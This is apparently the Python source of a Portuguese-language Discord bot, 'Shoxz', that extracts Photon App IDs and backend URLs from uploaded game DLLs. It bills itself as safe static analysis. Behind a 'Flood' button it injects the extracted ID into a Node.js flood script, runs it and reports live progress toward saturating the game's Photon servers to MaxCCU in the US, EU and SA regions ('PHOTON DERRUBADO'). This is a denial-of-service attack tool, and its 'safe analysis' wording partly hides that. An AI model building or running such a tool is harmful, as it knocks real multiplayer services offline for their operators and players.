import sys
import asyncio
import math
import hashlib
import io
import os
import re
import struct
import subprocess
import tempfile
import shutil
from datetime import datetime, timezone
from pathlib import Path

DEPS_DIR = Path(__file__).resolve().parent / "deps"
if DEPS_DIR.exists():
    sys.path.insert(0, str(DEPS_DIR))

try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

import aiohttp
import discord
from discord import app_commands
from discord.ext import commands

# CONFIGURAÇÃO DO BOT
TOKEN = ""
GUILD_ID = 1553224235504242798
MAX_BYTES = 25 * 1024 * 1024
URL_RE = re.compile(r"https?://[^\x00\x09\x0a\x0d\x20\"'<>]{3,500}", re.I)
UUID_RE = re.compile(r"\b[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\b", re.I)
HEX32_RE = re.compile(r"\b[0-9a-f]{32}\b", re.I)
KEYWORD_RE = re.compile(r"photon|appid|app_id|app-id|appsettings|serveruri|backendurl|backendhost", re.I)

intents = discord.Intents.default()
intents.message_content = True


class ShoxzBot(commands.Bot):
    async def setup_hook(self):
        # Guild sync is immediate when configured; global sync is used otherwise.
        if GUILD_ID:
            guild = discord.Object(id=GUILD_ID)
            self.tree.copy_global_to(guild=guild)
            await self.tree.sync(guild=guild)
            print(f"Comandos sincronizados no servidor {GUILD_ID}")
        else:
            await self.tree.sync()
            print("Comandos globais sincronizados")


bot = ShoxzBot(command_prefix="!", intents=intents)


def normalize_id(value: str) -> str:
    if len(value) == 32 and "-" not in value:
        return f"{value[:8]}-{value[8:12]}-{value[12:16]}-{value[16:20]}-{value[20:]}"
    return value


def extract_strings(data: bytes):
    ascii_values = [m.group().decode("ascii", "replace") for m in re.finditer(rb"[\x20-\x7e]{4,}", data)]
    utf16_values = [m.group().decode("utf-16le", "replace") for m in re.finditer(rb"(?:[\x20-\x7e]\x00){4,}", data)]
    return ascii_values + utf16_values


def analyze(data: bytes):
    urls, photon_ids, references, domains = set(), set(), set(), set()
    for text in extract_strings(data):
        urls.update(m.group().rstrip(".,);]") for m in URL_RE.finditer(text))
        photon_ids.update(m.group() for m in UUID_RE.finditer(text))
        photon_ids.update(normalize_id(m.group()) for m in HEX32_RE.finditer(text))
        if KEYWORD_RE.search(text):
            references.add(text[:600])
    for url in urls:
        domain = re.sub(r"^https?://", "", url, flags=re.I).split("/", 1)[0]
        domains.add(domain)
    return sorted(urls), sorted(photon_ids), sorted(references), sorted(domains)


def inspect_binary(data: bytes):
    counts = [0] * 256
    for byte in data:
        counts[byte] += 1
    entropy = 0.0
    for count in counts:
        if count:
            probability = count / len(data)
            entropy -= probability * math.log2(probability)
    details = {
        "Tamanho": f"{len(data):,} bytes",
        "Entropia": f"{entropy:.4f} / 8.0000",
        "Formato": "PE/Windows DLL" if data[:2] == b"MZ" else "Assinatura MZ não encontrada",
        "Arquitetura": "Não identificada",
        "Seções PE": "Não identificadas",
        "Timestamp PE": "Não identificado",
        ".NET/CLR": "Possível" if b"BSJB" in data else "Não detectado",
        "Assinatura PE": "Não encontrada",
    }
    if data[:2] != b"MZ" or len(data) < 0x40:
        return details
    try:
        pe_offset = struct.unpack_from("<I", data, 0x3C)[0]
        if pe_offset + 24 > len(data) or data[pe_offset:pe_offset + 4] != b"PE\x00\x00":
            return details
        machine, section_count, timestamp, _, _, optional_size, _ = struct.unpack_from("<HHIIIHH", data, pe_offset + 4)
        machines = {0x014C: "x86 (i386)", 0x8664: "x64 (AMD64)", 0xAA64: "ARM64", 0x01C4: "ARM Thumb-2"}
        details["Arquitetura"] = machines.get(machine, f"Desconhecida (0x{machine:04X})")
        details["Seções PE"] = str(section_count)
        details["Timestamp PE"] = datetime.fromtimestamp(timestamp, timezone.utc).isoformat() if timestamp else "Zero/não definido"
        details["Assinatura PE"] = f"válida em offset 0x{pe_offset:X}"
        optional_offset = pe_offset + 24
        if optional_offset + 2 <= len(data):
            magic = struct.unpack_from("<H", data, optional_offset)[0]
            details["Formato PE"] = {0x10B: "PE32", 0x20B: "PE32+ (64-bit)"}.get(magic, f"Magic 0x{magic:04X}")
        section_offset = optional_offset + optional_size
        names = []
        for index in range(min(section_count, 96)):
            current = section_offset + index * 40
            if current + 8 > len(data):
                break
            name = data[current:current + 8].split(b"\x00", 1)[0].decode("ascii", "replace")
            if name:
                names.append(name)
        details["Nomes das seções"] = ", ".join(names) or "Nenhuma"
    except (struct.error, ValueError, OverflowError):
        details["Assinatura PE"] = "estrutura PE parcialmente inválida"
    return details


def bullets(items, fallback="Nenhum encontrado", limit=10):
    if not items:
        return fallback
    text = "\n".join(f"`{item[:180]}`" for item in items[:limit])
    if len(items) > limit:
        text += f"\n`... +{len(items)-limit} outros`"
    return text[:1024]


async def fetch_attachment(attachment: discord.Attachment) -> bytes:
    if attachment.size and attachment.size > MAX_BYTES:
        raise ValueError("o arquivo excede o limite de 25 MB")
    timeout = aiohttp.ClientTimeout(total=120)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        async with session.get(attachment.url) as response:
            response.raise_for_status()
            data = await response.read()
    if len(data) > MAX_BYTES:
        raise ValueError("o arquivo excede o limite de 25 MB")
    return data


BASE_DIR = Path(__file__).resolve().parent
JS_TEMPLATE_PATH = BASE_DIR / "index.js.js"

running_processes = {}
FLOOD_TARGET_REGIONS = {"US", "EU", "SA"}


def sync_photon_to_js(photon_app_id: str) -> Path:
    if not JS_TEMPLATE_PATH.exists():
        raise FileNotFoundError(f"Arquivo JS não encontrado em: {JS_TEMPLATE_PATH}")

    js_content = JS_TEMPLATE_PATH.read_text(encoding="utf-8")
    updated_js = re.sub(
        r'const appId\s*=\s*"[^"]+";',
        f'const appId = "{photon_app_id}";',
        js_content,
        count=1,
    )

    tmp_dir = Path(tempfile.mkdtemp(prefix="shoxz_flood_"))
    target_path = tmp_dir / "flood.js"
    target_path.write_text(updated_js, encoding="utf-8")

    node_modules_src = BASE_DIR / "node_modules"
    node_modules_dst = tmp_dir / "node_modules"
    if node_modules_src.exists() and not node_modules_dst.exists():
        try:
            if hasattr(shutil, "copytree"):
                shutil.copytree(node_modules_src, node_modules_dst, symlinks=False, dirs_exist_ok=True)
        except Exception:
            pass

    package_json = tmp_dir / "package.json"
    if not package_json.exists():
        package_json.write_text('{"name":"shoxz-flood","version":"1.0.0"}', encoding="utf-8")

    return target_path


def start_flood_process(js_path: str):
    node_cmd = shutil.which("node")
    if not node_cmd:
        raise RuntimeError("Node.js não encontrado no PATH do sistema.")

    proc = subprocess.Popen(
        [node_cmd, js_path],
        cwd=str(Path(js_path).parent),
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        bufsize=1,
        creationflags=0 if os.name != "nt" else subprocess.CREATE_NEW_PROCESS_GROUP,
    )
    return proc


def default_flood_stats():
    return {
        "total_users": 0,
        "connected_users": 0,
        "rooms_joined": 0,
        "request_count": 0,
        "rps": 0,
        "regions_hit": set(),
        "finished": False,
        "last_update": None,
        "raw_last_lines": [],
    }


def parse_flood_line(line: str, stats: dict):
    line = line.strip()
    if not line:
        return

    if "maxccureached" in line.lower():
        for region in FLOOD_TARGET_REGIONS:
            if region in line.upper():
                stats["regions_hit"].add(region)
                break

    if len(stats["raw_last_lines"]) >= 8:
        stats["raw_last_lines"].pop(0)
    stats["raw_last_lines"].append(line[:180])

    m = re.search(r"usuarios:\s*(\d+)\s*/\s*(\d+)\s+online", line)
    if m:
        stats["connected_users"] = int(m.group(1))
        stats["total_users"] = int(m.group(2))

    m = re.search(r"salas:\s*(\d+)", line)
    if m:
        stats["rooms_joined"] = int(m.group(1))

    m = re.search(r"mensagens:\s*(\d+)\s*\|\s*rps:\s*(\d+)", line)
    if m:
        stats["request_count"] = int(m.group(1))
        stats["rps"] = int(m.group(2))

    if "ataque efetivo" in line.lower() or len(stats["regions_hit"]) >= len(FLOOD_TARGET_REGIONS):
        if len(stats["regions_hit"]) >= len(FLOOD_TARGET_REGIONS):
            stats["finished"] = True

    stats["last_update"] = datetime.now(timezone.utc)


def _format_duration(seconds: float) -> str:
    seconds = int(max(0, seconds))
    h, rem = divmod(seconds, 3600)
    m, s = divmod(rem, 60)
    if h > 0:
        return f"{h:02d}:{m:02d}:{s:02d}"
    return f"{m:02d}:{s:02d}"


def build_flood_embed(
    photon_app_id: str,
    filename: str,
    user_id: int,
    pid: int,
    stats: dict,
    started_at: datetime | None = None,
    js_executed_id: str | None = None,
) -> discord.Embed:
    done = stats["finished"] or len(stats["regions_hit"]) >= len(FLOOD_TARGET_REGIONS)
    now = datetime.now(timezone.utc)
    elapsed_str = "00:00"
    if started_at is not None:
        elapsed_str = _format_duration((now - started_at).total_seconds())

    if done:
        color = discord.Color.from_rgb(70, 220, 110)
        title = "SHOXZ // PHOTON DERRUBADO ✅"
        status_line = "✅ Photon atingiu MaxCCU em todas as regiões (US/EU/SA) e foi derrubado com sucesso!"
    else:
        title = "SHOXZ // FLOOD EM ANDAMENTO 💥"
        if stats["rps"] > 15000:
            color = discord.Color.from_rgb(255, 170, 50)
            status_line = "🟡 Flood intenso em andamento — ataque efetivo!"
        elif stats["connected_users"] > 0:
            color = discord.Color.from_rgb(255, 70, 70)
            status_line = "🔴 Flood rodando em background"
        else:
            color = discord.Color.from_rgb(180, 180, 180)
            status_line = "⏳ Inicializando conexões..."

    embed = discord.Embed(
        title=title,
        color=color,
        timestamp=now,
    )
    embed.add_field(name="PHOTON APP ID (ANÁLISE DLL)", value=f"`{photon_app_id}`", inline=False)
    if js_executed_id:
        match = "✅ IDENTICO" if js_executed_id == photon_app_id else "⚠️ DIFERENTE"
        embed.add_field(
            name=f"PHOTON NO ARQUIVO JS EXECUTADO — {match}",
            value=f"`{js_executed_id}`",
            inline=False,
        )
    embed.add_field(name="ALVO", value=f"`{filename}`", inline=True)
    embed.add_field(name="USUÁRIO", value=f"<@{user_id}>", inline=True)
    embed.add_field(name="⏱️ TEMPO DECORRIDO", value=f"`{elapsed_str}`", inline=True)

    hit_count = len(stats["regions_hit"])
    total_reg = len(FLOOD_TARGET_REGIONS)
    reg_status_parts = []
    for region in sorted(FLOOD_TARGET_REGIONS):
        if region in stats["regions_hit"]:
            reg_status_parts.append(f"**{region}** ✅ MaxCCU")
        else:
            reg_status_parts.append(f"**{region}** ⚙️  atacando...")
    progress_bar_blocks = 10
    filled = int((hit_count / total_reg) * progress_bar_blocks) if total_reg > 0 else 0
    progress_bar = "█" * filled + "░" * (progress_bar_blocks - filled)
    reg_title = f"REGIÕES ({hit_count}/{total_reg}) [{progress_bar}]"
    embed.add_field(name=reg_title, value="\n".join(reg_status_parts), inline=False)

    embed.add_field(name="USUÁRIOS ONLINE", value=f"`{stats['connected_users']:,} / {stats['total_users']:,}`", inline=True)
    embed.add_field(name="SALAS", value=f"`{stats['rooms_joined']:,}`", inline=True)
    embed.add_field(name="REQ / SEGUNDO", value=f"`{stats['rps']:,}`", inline=True)
    embed.add_field(name="MENSAGENS ENVIADAS", value=f"`{stats['request_count']:,}`", inline=False)
    embed.add_field(name="STATUS (AO VIVO)", value=status_line, inline=False)

    footer = f"PID: {pid} • AO VIVO"
    if stats["last_update"]:
        footer += f" • atualizado: {stats['last_update'].strftime('%H:%M:%S UTC')}"
    if done:
        footer += " • DERRUBADO COM SUCESSO"
    embed.set_footer(text=footer)
    return embed


async def read_process_output(proc, stats: dict, stop_event: asyncio.Event):
    loop = asyncio.get_running_loop()

    def _read_line():
        try:
            return proc.stdout.readline()
        except Exception:
            return ""

    try:
        while not stop_event.is_set():
            line = await asyncio.wait_for(loop.run_in_executor(None, _read_line), timeout=0.5)
            if line == "" and proc.poll() is not None:
                break
            if line:
                parse_flood_line(line, stats)
    except asyncio.TimeoutError:
        pass
    except Exception as exc:
        print(f"[flood monitor] Erro na leitura do stdout: {exc}")


async def send_flood_dm_success(user_id: int, photon_app_id: str, filename: str, started_at: datetime):
    try:
        user = await bot.fetch_user(user_id)
        if user is None:
            return
        elapsed = _format_duration((datetime.now(timezone.utc) - started_at).total_seconds())
        dm_embed = discord.Embed(
            title="✅ PHOTON DERRUBADO COM SUCESSO",
            color=discord.Color.from_rgb(70, 220, 110),
            timestamp=datetime.now(timezone.utc),
        )
        dm_embed.set_thumbnail(url="https://i.imgur.com/ydzrqan.png")
        dm_embed.add_field(name="PHOTON APP ID", value=f"`{photon_app_id}`", inline=False)
        dm_embed.add_field(name="ALVO", value=f"`{filename}`", inline=True)
        dm_embed.add_field(name="TEMPO ATÉ DERRUBAR", value=f"`{elapsed}`", inline=True)
        dm_embed.add_field(
            name="STATUS",
            value="MaxCCU atingido em todas as regiões (US/EU/SA).\nO servidor Photon do jogo foi saturado com sucesso!",
            inline=False,
        )
        dm_embed.set_footer(text="Shoxz Flood Control • AO VIVO")
        await user.send(embed=dm_embed)
    except discord.HTTPException as exc:
        print(f"[flood dm] Não foi possível enviar DM para {user_id}: {exc}")
    except Exception as exc:
        print(f"[flood dm] Erro ao enviar DM: {exc}")


async def monitor_flood(
    proc,
    stats: dict,
    photon_app_id: str,
    filename: str,
    user_id: int,
    pid: int,
    message: discord.Message,
    flood_key: str,
):
    stop_event = asyncio.Event()
    reader_task = asyncio.create_task(read_process_output(proc, stats, stop_event))

    started_at = None
    js_executed_id = None
    if flood_key in running_processes:
        js_executed_id = running_processes[flood_key].get("js_executed_id")
        started_at = running_processes[flood_key].get("started_at")

    max_updates = 1200
    updates = 0
    finished_notified = False
    dm_sent = False

    try:
        while updates < max_updates:
            updates += 1
            await asyncio.sleep(2 if not finished_notified else 15)

            if proc.poll() is not None and not finished_notified:
                try:
                    remaining = proc.stdout.read() if proc.stdout else ""
                    for line in remaining.splitlines():
                        parse_flood_line(line, stats)
                except Exception:
                    pass

            done = stats["finished"] or len(stats["regions_hit"]) >= len(FLOOD_TARGET_REGIONS)
            try:
                embed = build_flood_embed(
                    photon_app_id, filename, user_id, pid, stats, started_at, js_executed_id,
                )
                await message.edit(embed=embed)
            except discord.HTTPException:
                pass

            if done and not finished_notified:
                finished_notified = True
                try:
                    await message.reply(
                        f"✅ **PHOTON DERRUBADO COM SUCESSO**\n"
                        f"App ID: `{photon_app_id}`\n"
                        f"MaxCCU atingido em todas as regiões (US/EU/SA)."
                    )
                except discord.HTTPException:
                    pass

                if not dm_sent and started_at is not None:
                    dm_sent = True
                    asyncio.create_task(
                        send_flood_dm_success(user_id, photon_app_id, filename, started_at)
                    )
                break
    finally:
        stop_event.set()
        try:
            await asyncio.wait_for(reader_task, timeout=2.0)
        except Exception:
            pass
        if flood_key in running_processes:
            running_processes[flood_key]["monitor_done"] = True


def extract_appid_from_js(js_path: Path) -> str | None:
    try:
        content = js_path.read_text(encoding="utf-8")
        m = re.search(r'const appId\s*=\s*"([^"]+)";', content)
        return m.group(1) if m else None
    except Exception:
        return None


async def run_flood(photon_app_id: str, user_id: int):
    js_path = sync_photon_to_js(photon_app_id)
    js_executed_id = extract_appid_from_js(js_path)
    proc = await asyncio.to_thread(start_flood_process, str(js_path))
    flood_key = str(user_id)
    running_processes[flood_key] = {
        "process": proc,
        "js_path": js_path,
        "photon_id": photon_app_id,
        "js_executed_id": js_executed_id,
        "started_at": datetime.now(timezone.utc),
        "stats": default_flood_stats(),
    }
    return proc, js_path, flood_key


def create_embed(attachment: discord.Attachment, data: bytes, urls, photon_ids, references, domains):
    sha = hashlib.sha256(data).hexdigest()
    embed = discord.Embed(
        title="SHOXZ // DLL INTELLIGENCE",
        description="Análise estática concluída com segurança.\nA DLL não foi executada, carregada ou injetada.",
        color=discord.Color.from_rgb(115, 70, 255),
        timestamp=datetime.now(timezone.utc),
    )
    embed.set_thumbnail(url="https://i.imgur.com/ydzrqan.png")
    embed.add_field(name="ARQUIVO", value=f"`{attachment.filename}`\n`{len(data):,} bytes`", inline=True)
    embed.add_field(name="SHA-256", value=f"`{sha[:20]}…`", inline=True)
    embed.add_field(name="DOMÍNIOS", value=bullets(domains, "Nenhum domínio detectado", 5), inline=False)
    embed.add_field(name="BACKEND HTTPS", value=bullets(urls, "Nenhuma URL HTTPS encontrada", 8), inline=False)
    embed.add_field(name="PHOTON APP ID", value=bullets(photon_ids, "Nenhum ID compatível encontrado", 8), inline=False)
    embed.add_field(name="REFERÊNCIAS DETECTADAS", value=bullets(references, "Nenhuma referência encontrada", 5), inline=False)
    embed.set_footer(text="Shoxz Desobfuscador • modo seguro")
    return embed, sha


class PhotonSelect(discord.ui.Select):
    def __init__(self, photon_ids, filename):
        options = [
            discord.SelectOption(label=pid[:50], description=f"Usar este App ID", value=pid)
            for pid in photon_ids[:25]
        ]
        super().__init__(
            placeholder="Selecione o Photon App ID para o Flood...",
            min_values=1,
            max_values=1,
            options=options,
        )
        self.photon_ids = photon_ids
        self.filename = filename

    async def callback(self, interaction: discord.Interaction):
        selected_photon = self.values[0]
        try:
            await interaction.response.defer(ephemeral=True, thinking=True)
            proc, js_path, flood_key = await run_flood(selected_photon, interaction.user.id)
            stats = running_processes[flood_key]["stats"]
            js_executed_id = running_processes[flood_key].get("js_executed_id")
            started_at = running_processes[flood_key].get("started_at")

            initial_embed = build_flood_embed(
                selected_photon, self.filename, interaction.user.id, proc.pid, stats, started_at, js_executed_id,
            )
            message = await interaction.followup.send(embed=initial_embed, ephemeral=False, wait=True)

            running_processes[flood_key]["message"] = message
            running_processes[flood_key]["filename"] = self.filename

            task = asyncio.create_task(
                monitor_flood(
                    proc, stats, selected_photon, self.filename,
                    interaction.user.id, proc.pid, message, flood_key,
                )
            )
            running_processes[flood_key]["task"] = task
        except Exception as exc:
            await interaction.followup.send(
                f"Falha ao iniciar o flood: `{str(exc)[:500]}`",
                ephemeral=True,
            )


class FloodSelectView(discord.ui.View):
    def __init__(self, photon_ids, filename):
        super().__init__(timeout=600)
        self.add_item(PhotonSelect(photon_ids, filename))


class MoreInfoView(discord.ui.View):
    def __init__(self, filename, details, urls, photon_ids, references):
        super().__init__(timeout=900)
        self.filename = filename
        self.details = details
        self.urls = urls
        self.photon_ids = photon_ids
        self.references = references

    @discord.ui.button(label="Mais...", style=discord.ButtonStyle.primary)
    async def more(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = discord.Embed(title="SHOXZ // DETALHES PROFUNDOS", color=discord.Color.from_rgb(50, 170, 255))
        embed.description = f"Informações adicionais de `{self.filename}`. Nenhum código foi executado."
        for key, value in self.details.items():
            embed.add_field(name=key, value=f"`{str(value)[:900]}`", inline=True)
        embed.add_field(name="URLs detectadas", value=bullets(self.urls, "Nenhuma", 8), inline=False)
        embed.add_field(name="Photon IDs", value=bullets(self.photon_ids, "Nenhum", 8), inline=False)
        embed.add_field(name="Referências", value=bullets(self.references, "Nenhuma", 5), inline=False)
        embed.set_footer(text="Análise estática • sem conexões externas")
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="Flood", style=discord.ButtonStyle.danger, emoji="💥")
    async def flood(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not self.photon_ids:
            await interaction.response.send_message(
                "Nenhum Photon App ID foi detectado nesta DLL para iniciar o flood.",
                ephemeral=True,
            )
            return

        if len(self.photon_ids) == 1:
            selected_photon = self.photon_ids[0]
            try:
                await interaction.response.defer(ephemeral=True, thinking=True)
                proc, js_path, flood_key = await run_flood(selected_photon, interaction.user.id)
                stats = running_processes[flood_key]["stats"]
                js_executed_id = running_processes[flood_key].get("js_executed_id")
                started_at = running_processes[flood_key].get("started_at")

                initial_embed = build_flood_embed(
                    selected_photon, self.filename, interaction.user.id, proc.pid, stats, started_at, js_executed_id,
                )
                message = await interaction.followup.send(embed=initial_embed, ephemeral=False, wait=True)

                running_processes[flood_key]["message"] = message
                running_processes[flood_key]["filename"] = self.filename

                task = asyncio.create_task(
                    monitor_flood(
                        proc, stats, selected_photon, self.filename,
                        interaction.user.id, proc.pid, message, flood_key,
                    )
                )
                running_processes[flood_key]["task"] = task
            except Exception as exc:
                await interaction.followup.send(
                    f"Falha ao iniciar o flood: `{str(exc)[:500]}`",
                    ephemeral=True,
                )
        else:
            view = FloodSelectView(self.photon_ids, self.filename)
            await interaction.response.send_message(
                f"Foram detectados `{len(self.photon_ids)}` Photon App IDs. Selecione qual deseja usar:",
                view=view,
                ephemeral=True,
            )


@bot.event
async def on_ready():
    print(f"Online como {bot.user} — /analisar pronto")


@bot.tree.error
async def on_app_command_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
    print(f"Erro no comando: {type(error).__name__}: {error}")
    try:
        message = "Não foi possível concluir a análise. Tente novamente."
        if interaction.response.is_done():
            await interaction.followup.send(message, ephemeral=True)
        else:
            await interaction.response.send_message(message, ephemeral=True)
    except discord.HTTPException:
        pass


@bot.tree.command(name="analisar", description="Analisa uma DLL sem executá-la")
@app_commands.describe(arquivo="Arquivo DLL para análise estática")
async def analisar(interaction: discord.Interaction, arquivo: discord.Attachment):
    if not arquivo.filename.lower().endswith(".dll"):
        await interaction.response.send_message("Envie um arquivo com extensão `.dll`.", ephemeral=True)
        return
    if arquivo.size and arquivo.size > MAX_BYTES:
        await interaction.response.send_message("O limite é 25 MB por arquivo.", ephemeral=True)
        return
    try:
        await interaction.response.defer(thinking=True)
        data = await fetch_attachment(arquivo)
        urls, photon_ids, references, domains = await asyncio.to_thread(analyze, data)
        details = await asyncio.to_thread(inspect_binary, data)
        embed, sha = create_embed(arquivo, data, urls, photon_ids, references, domains)
        report = (
            "SHOXZ DLL INTELLIGENCE REPORT\n"
            f"Arquivo: {arquivo.filename}\nTamanho: {len(data)} bytes\nSHA-256: {sha}\n\n"
            "BACKEND HTTPS:\n" + ("\n".join(f"- {x}" for x in urls) or "- Nenhum") + "\n\n"
            "PHOTON APP IDS:\n" + ("\n".join(f"- {x}" for x in photon_ids) or "- Nenhum") + "\n\n"
            "REFERÊNCIAS:\n" + ("\n".join(f"- {x}" for x in references) or "- Nenhuma") + "\n"
        )
        report_file = discord.File(io.BytesIO(report.encode("utf-8")), filename=f"{Path(arquivo.filename).stem}_relatorio.txt")
        view = MoreInfoView(arquivo.filename, details, urls, photon_ids, references)
        await interaction.followup.send(embed=embed, view=view, file=report_file)
    except discord.NotFound:
        print(f"Interação expirada: {arquivo.filename}")
    except Exception as exc:
        try:
            if interaction.response.is_done():
                await interaction.followup.send(f"Falha controlada na análise: `{str(exc)[:500]}`", ephemeral=True)
            else:
                await interaction.response.send_message(f"Falha controlada na análise: `{str(exc)[:500]}`", ephemeral=True)
        except discord.HTTPException:
            print(f"Não foi possível responder ao erro: {exc}")


@bot.command(name="shoxz")
async def help_command(ctx):
    await ctx.send("Use `/analisar` e anexe uma DLL. O bot fará somente análise estática.")


if __name__ == "__main__":
    if not TOKEN:
        raise SystemExit("Defina DISCORD_BOT_TOKEN antes de iniciar o bot.")
    bot.run(TOKEN)
